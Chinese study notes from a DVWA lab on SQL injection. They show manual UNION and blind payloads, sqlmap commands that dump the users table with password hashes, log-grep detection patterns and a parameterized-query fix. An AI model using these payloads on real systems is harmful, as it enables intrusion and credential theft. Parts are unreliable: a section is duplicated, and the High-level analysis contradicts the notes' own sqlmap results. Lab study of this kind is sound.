DVWA-SQL注入

- SQL注入（Low）学习

1）输入尝试

- 输入 1

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_001.png)

结果：会正常显示用户，这是基础功能

- 输入 1’

结果：会报错（SQL语法错误）说明有注入点
![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_002.png)

- 输入 1’ OR ’1’=’1

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_003.png)

结果：会显示所有用户，注入成功

- 输入 1’ UNION SELECT 1,database()--

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_004.png)

结果：会显示数据库名dvwa（注意：最后结尾有空格否则会输出500错误）

- 输入 1’ UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_005.png)

结果：会显示所有的表名

- 输入 1’ UNION SELECT user,password FROM users--

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_006.png)

结果：显示用户名和MD5密码，拿到了全部账号

2）查看日志

- DVWA的日志文件：/var/log/apache2/access.log

- 实时查看文件：tail -f /var/log/apache2/access.log | grep "sqli"

会看到一条这样的日志：

192.168.103.1 - - [08/Aug/2026:06:59:48 -0400] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2Cdatabase%28%29--+&Submit=Submit HTTP/1.1" 200 1848 "http://192.168.103.131/dvwa/vulnerabilities/sqli/?id=1%E2%80%98&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0"

标红的就是你的sql攻击，并且里面 %27 是 ’ 的意思，%3D 就是 = 的意思

3）写检测命令

统计今天谁尝试了SQL注入

grep -iE "union.*select|sleep\(|1=1|-- " /var/log/apache2/access.log | awk ‘{print $1}’ | sort | uniq -c | sort -rn

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_007.png)

4）填表统计

| 漏洞 | 攻击Payload | 日志grep | 防御 |
|---|---|---|---|
| SQL注入 | 1‘ UNION SELECT user,password FROM users-- | grep -iE "union.*select\|sleep\(\|1=1\|-- " | 参数化查询 |

- SQL注入（Medium）学习

- 使用抓包攻击Burp（因为从输入框，变成了选项框，浏览器F12的Network选项卡也可以改，网址也可以，但是网址比较复杂）

- 输入 1’+OR+‘1’=1

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_008.png)
![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_009.png)

结果：会显示报错，因为Medium级别的防护（用了 mysqli_real_escape_string()，会把单引号转义成 \'。所以 ' OR '1'='1 会被转义失效）

2、输入 1+OR+1=1

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_010.png)

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_011.png)

结果：将数据库的所有用户信息输出了

3、输入 1+UNION+SELECT+1,database()--

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_012.png)

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_013.png)

结果：这样就拿到了数据库的库名

4、输入 1+UNION+SELECT+user,passwrod+FROM+users--

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_014.png)

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_015.png)

结果：这样就可以拿到该数据库的所有账号和MD5格式的密码了

- SQLMap自动化注入学习

- 准备工作

- 获取Cookie

浏览器F12 → APPlication → Cookies

![](images/1-DVWA-SQL注入/1-DVWA-SQL注入_016.png)

会看见两个Cookie：

| Cookie | 值 |
|---|---|
| `PHPSESSID` | 一串字符（你的会话） |
| `security` | `high`（或 `medium`，看你当前级别） |

- 打开终端运行

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=你的值; security=low" \

--batch

SQLMap会先检测注入点，等它跑完，大概30-60秒。

- 继续运行sqlmap

1.拿数据库列表：

sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=你的值; security=low" \

--dbs --batch

2.拿dvwa库的表：

sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=你的值; security=low" \

-D dvwa --tables --batch

3.托users表数据（用户名+哈希密码）：

sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=你的值; security=low" \

-D dvwa -T users --dump --batch

注意：以上仅是自动化low级的sql注入

- 如果想要自动化Medium级别的话需要增加--data参数

sqlmap -u "http://192.168.103.1/vulnerabilities/sqli/" \

--data="id=1&Submit=Submit" \

--cookie="PHPSESSID=你的值; security=medium" \

--batch -D dvwa -T users --dump

5、		High自动化

sqlmap -u "http://192.168.103.1/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=你的值; security=high" \

--level=3 --risk=2 --batch --dbs

成功：

#这次的 --level=3 --risk=2 生效了，SQLMap 成功找到了 4 种注入类型：

Parameter: id (GET)

Type: boolean-based blind（布尔盲注）

Type: error-based（报错注入）

Type: time-based blind（时间盲注）

Type: UNION query（联合查询（2列））

#back-end DBMS is MySQL —— 确认是 MySQL 5.1+，页面技术 PHP 7.3.4。

#这说明 High 级别确实可以用 --level=3 --risk=2 绕过！

失败：

[ERROR] unable to retrieve the number of databases

[CRITICAL] unable to retrieve the database names

找到了注入点，但拖数据时失败了。常见原因：

High 级别有 LIMIT 1 限制，UNION 查询一次只能返回 1 行，导致数据提取受限

时间盲注网络不稳定，统计模型建立失败

High的防护：

- LIMIT 1：限制了UNION的查询，只允许返回1行；

- intval()：将传入的值强制转成整数（这限制导致了几乎不可能sql注入）

- 日志查询

[Sun Aug  9 22:50:01 2026] 192.168.103.131:33482 [200]: /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71706a7871%2CIFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%2C0x7170716271%29%23&Submit=Submit

# 检测 SQLMap 特征：大量相同路径、不同参数值的请求

grep "sqli" access.log | awk '{print $1, $7}' | sort | uniq -c | sort -rn | head -20

## 三个级别源码对比（面试高频考点）
### Low 级别
// 无任何过滤，直接拼接SQL
$id = $_GET["id"];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"

### Medium 级别
// 使用 mysqli_real_escape_string() 转义特殊字符
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET["id"]);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"

### High 级别
// 使用 intval() 强制转整数 + LIMIT 1
$id = intval($_GET["id"]);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;"

| 级别 | 防御方式 | 绕过难度 | 攻击方式 |
|---|---|---|---|
| Low | 无过滤 | 1/5 极低 | 所有注入方式 |
| Medium | mysqli_real_escape_string() | 2/5 低 | 数字型/盲注 |
| High | intval() + LIMIT 1 | 4/5 高 | 几乎不可注入 |

## SQL注入（High）学习
DVWA High 级别的防护比 Low/Medium 强很多，核心防护机制如下：

### 1）源码分析
// DVWA High 级别核心代码
$id = $_GET["id"];
$id = intval($id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";

intval() 的威力：

输入 1 OR 1=1 后 intval 变成 1（单引号和其他字符全被砍掉）

输入 UNION SELECT 后 intval 变成 0（UNION 不是数字开头）

只有纯数字输入能通过，注入点被完全封闭

### 2）SQLMap 测试 High 级别
SQLMap 可以检测到注入点类型，但无法拖取数据：

# 检测注入点
sqlmap -u "http://192.168.103.1/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=your_value; security=high" --level=3 --risk=2 --batch

结论：High 级别的 intval() 是 SQL 注入的终结者之一。

## 盲注（Blind SQL Injection）原理
当页面不显示数据库错误信息，也不显示查询结果时，就需要使用盲注。分为两种：

### 1）布尔盲注（Boolean-based Blind SQLi）
原理：页面返回 True/False 两种状态，通过逐位推断数据。

# 条件为真时正常显示用户
1' AND 1=1-- 

# 条件为假时页面不显示用户
1' AND 1=2-- 

# 推断数据库名长度
1' AND LENGTH(database())=4--

### 2）时间盲注（Time-based Blind SQLi）
原理：页面永远不回显差异，使用 SLEEP() 函数根据响应时间推断。

## 盲注（Blind SQL Injection）原理
当页面不显示数据库错误信息，也不显示查询结果时，就需要使用盲注。分为两种：

### 1）布尔盲注（Boolean-based Blind SQLi）
原理：页面返回 True/False 两种状态，通过逐位推断数据。

# 条件为真时正常显示用户
1' AND 1=1-- 

# 条件为假时页面不显示用户
1' AND 1=2-- 

# 推断数据库名长度
1' AND LENGTH(database())=4--

### 2）时间盲注（Time-based Blind SQLi）
原理：页面永远不回显差异，使用 SLEEP() 函数根据响应时间推断。

# 测试时间盲注
1' AND SLEEP(5)--  # 延迟5秒

# 结合条件判断
1' AND IF(LENGTH(database())=4, SLEEP(3), 0)--

## SQL注入攻击与防御全景表
| 攻击类型 | 检测方法 | 防御方案 | 优先级 |
|---|---|---|---|
| UNION 注入 | union.*select | 参数化查询 | P0 必做 |
| 布尔盲注 | 1=1\|1=2 | WAF + 限频 | P0 必做 |
| 时间盲注 | sleep(\|benchmark | 禁用危险函数 | P0 必做 |
| 报错注入 | extractvalue\|updatexml | 关闭错误输出 | P1 建议 |
| 堆叠查询 | ;(DROP\|INSERT\|UPDATE) | 限制用户权限 | P1 建议 |
| 宽字节注入 | %df%27\|%df%5c | UTF-8编码 | P2 了解 |

### 参数化查询示例
// 正确做法（PHP + PDO）
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);

// 错误做法（危险！）
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";

## test heading
# 检测 sqlmap 特征请求
 grep -i sqlmap /var/log/apache2/access.log

## 2）实时监控脚本（SOC场警）,level=2
# 实时监控 SQL 注入
tail -f /var/log/apache2/access.log | grep -iE 'union.*select|sleep\(|1=1|-- '

## SQL注入完整学习路线图
| 阶段 | 内容 | 对应章节 | 时间 |
|---|---|---|---|
| 1. 基础注入 | UNION查询、报错注入 | Low级别 | Day 19 |
| 2. 绕过技巧 | 编码绕过、双写绕过 | Medium级别 | Day 19 |
| 3. 工具自动化 | SQLMap基本使用 | SQLMap章节 | Day 20 |
| 4. 盲注 | 布尔盲注、时间盲注 | 盲注章节 | Day 20 |
| 5. 高级防御 | intval()、参数化查询 | High级别+源码 | Day 20 |
| 6. 日志分析 | 攻击检测、流量分析 | 扩展检测命令 | 贯穿全程 |
| 7. 防御实战 | WAF规则、代码审计 | 防御全景表 | 后续学习 |
